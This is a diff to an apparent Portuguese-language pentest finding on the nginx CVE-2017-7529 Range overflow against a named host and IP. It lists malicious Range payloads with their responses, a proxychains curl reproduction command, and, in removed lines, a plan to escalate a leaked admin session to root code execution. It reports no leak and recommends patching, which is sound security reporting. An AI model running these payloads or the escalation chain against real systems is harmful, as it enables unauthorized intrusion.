@@ -1,32 +1,82 @@
-# F-006 nginx 1.7.5 — CVE-2017-7529 Range Integer Overflow (provável leak)
-Alvo: video02.soultv.com.br (160.202.130.243:80)
-Severidade: Média (info disclosure potencial)
-Timestamp: 2026-08-27T15:15:00Z
+# F-006 nginx 1.7.5 — CVE-2017-7529 Range Integer Overflow (BUG CONFIRMADO, sem leak)
+Alvo: video02.soultv.com.br (160.202.130.243:80, :443)
+Severidade: **Baixa** (vuln presente, sem disclosure confirmado)
+Status: **Confirmado (bug behavior) — não explorável para info leak neste host**
+Timestamp: 2026-08-27T16:50:00Z (validado Fase 7b — exploit)
 
 ## Sumário
-O nginx versão 1.7.5 (2014) em video02 é vulnerável ao CVE-2017-7529 (CVSS 7.5). A vulnerabilidade permite que um request com Range header malicioso cause integer overflow e vazamento de memória/cache adjacente (potencialmente vazando dados de sessão, tokens, cookies de admin).
+O nginx 1.7.5 (2014) em video02 está dentro do range afetado pelo **CVE-2017-7529**
+(CVSS 7.5, nginx 0.5.6 – 1.13.2). A vulnerabilidade permite que um request com `Range`
+malicioso cause integer overflow e vazamento de memória/cache adjacente (potencialmente
+expondo sessões/tokens de admin). **A valiengem confirmou o bug behavior** (nginx aceita
+Range negativo e responde `206 Partial Content`), **porém nenhum vazamento de dados foi
+alcançado** porque o host não expõe conteúdo servido a partir do `proxy_cache` do nginx —
+todos os paths 200 (`/crossdomain.xml`, `/clientaccesspolicy.xml`) são servidos pelo Wowza
+REST (upstream) com `Cache-Control: no-cache`, e o range filter faz clamp no tamanho do
+arquivo (não há cache node adjacente para ler).
 
-## Reprodução
-O PoC padrão (Range: bytes=-17208,-9223372036854758998) foi testado:
-- `/crossdomain.xml` → **HTTP 206 Partial Content** (resposta normalmente 200 OK)
-- `/clientaccesspolicy.xml` → **HTTP 206 Partial Content** (resposta normalmente 200 OK)
-- `/favicon.ico` → **HTTP 401** (autenticação primeiro, mas ainda responde como range request)
-- `/` → **HTTP 401** (idem)
+## Reprodução (validação Fase 7b)
 
-Os endpoints que retornam 206 confirmam que o nginx processou o range malicioso. Não foi possível confirmar vazamento de dados de sessão/sensíveis pois os endpoints que leakam memória são aqueles com conteúdo em cache (arquivos estáticos servidos via proxy_cache) — o cache real do Wowza está atrás do nginx proxy.
+### Bug behavior CONFIRMADO — nginx aceita Range negativo
+```
+GET /clientaccesspolicy.xml  -> HTTP 200, 337 bytes
+GET /clientaccesspolicy.xml  com "Range: bytes=-1"
+   -> HTTP 206 Partial Content, Content-Range: bytes 336-336/337, 1 byte
+GET /clientaccesspolicy.xml  com "Range: bytes=-9223372036854775807"  (Long.MIN_VALUE)
+   -> HTTP 206 Partial Content, Content-Range: bytes 0-336/337, 337 bytes
+GET /crossdomain.xml  com "Range: bytes=-9223372036854775807"
+   -> HTTP 206 Partial Content, Content-Range: bytes 0-281/282, 282 bytes
+```
+Um nginx **parcheado** rejeitaria o Range negativo com 416 Range Not Satisfiable. O host
+responde 206 → **bug presente** (não patcheado).
 
-## Potencial de exploração
-Se um admin estiver logado no Wowza Manager (8088) e houver cache de páginas do Manager no nginx, é possível usar esta técnica para vazar:
-- Tokens JSESSIONID de sessão admin
-- Digest nonces/tokens
-- Headers de autenticação
+### Tentativa de LEAK — TODOS os offsets clamped ao tamanho do arquivo
+Testados 11 ranges negativos (incl. Long.MIN_VALUE e offsets intermediários em potências de 2):
+```
+Range=-1                          -> 206, 1 byte   (Content-Range 336-336/337)
+Range=-2                          -> 206, 2 bytes  (Content-Range 335-336/337)
+Range=-100                        -> 206, 100 bytes
+Range=-1000                       -> 206, 337 bytes (clamped 0-336/337)
+Range=-9223372036854775807        -> 206, 337 bytes (clamped 0-336/337)
+Range=-72057594037927935 (2^56)   -> 206, 337 bytes (clamped)
+Range=-36028797018963967 (2^55)   -> 206, 337 bytes (clamped)
+Range=-1125899906842624 (2^50)    -> 206, 337 bytes (clamped)
+Range=-562949953421312 (2^49)     -> 206, 337 bytes (clamped)
+Range=-1,0,-9223372036854775807   -> 206, 1 byte
+```
+**NENHUMA resposta excedeu o tamanho real do arquivo** (337/282 bytes). Não houve leak de
+bytes adjacentes — o integer overflow que vaza conteúdo do cache node anterior NÃO
+dispara, pois o conteúdo servido não passa pelo `proxy_cache` do nginx (header
+`Cache-Control: no-cache` no upstream Wowza, sem cache file alocado).
 
-Requer que o endpoint em cache tenha conteúdo sensível.
+## Paths testados
+- `/`                  -> 401 (Wowza Digest auth via nginx proxy)
+- `/index.html` `/robots.txt` `/favicon.ico` `/static/` `/healthcheck.html` `/status` -> 401
+- `/crossdomain.xml`   -> 200, 282 bytes, `Cache-Control: no-cache` (Wowza upstream)
+- `/clientaccesspolicy.xml` -> 200, 337 bytes, `Cache-Control: no-cache` (Wowza upstream)
+
+Nenhum path expõe conteúdo cacheável estático servido diretamente pelo nginx (tudo é
+proxy para o Wowza REST em 8087). Sem cache = sem adjacência de memória para leak.
 
 ## Impacto
-- **Médio**: potencial para info disclosure de sessões admin
-- Sem confirmação de vazamento de dados sensíveis neste momento
+- **Baixo**: bug presente (nginx não patcheado), mas **sem info leak confirmado** neste host.
+- Não foi possível vazar sessões admin (JSESSIONID), Digest nonces, ou tokens — não há
+  conteúdo em cache adjacente para explorar a via clássica do CVE.
+- Persiste risco residual se futuro deploy habilitar `proxy_cache` para paths estáticos.
 
-## Próximo passo
-- Script automatizado de leak (variação de ranges e offsets) no /clientaccesspolicy.xml (que não requer auth) para tentar vazar dados de cache adjacente
-- Se obtiver sessão admin, cadeia para RCE root via CVE-2024-52052
+## Recomendação
+- Atualizar nginx 1.7.5 → versão ≥ 1.13.3 (patch do CVE-2017-7529). Versão 1.7.5 (2014) está
+  fora de suporte há 11 anos e acumula múltiplas CVEs (ver cve_nginx.txt) — upgrade é mandatório.
+- Não habilitar `proxy_cache` em paths do Wowza Manager sem revisão de exposição de dados.
+
+## Evidência bruta
+- `exploit/outputs/leak_*.bin` — respostas dos 11 ranges testados
+- `exploit/outputs/cd1.txt` `cd2.txt` — baseline vs Range negativo em /crossdomain.xml
+- `exploit/pocs/poc_cve_2017_7529_nginx.sh` — PoC executado
+
+## Reprodução rápida
+```bash
+proxychains4 -q curl -sI -H "Range: bytes=-9223372036854775807" http://160.202.130.243/clientaccesspolicy.xml
+# Esperado (vuln): 206 Partial Content, Content-Range: bytes 0-336/337, 337 bytes (clamped, sem leak)
+# nginx patcheado: 416 Range Not Satisfiable
+```
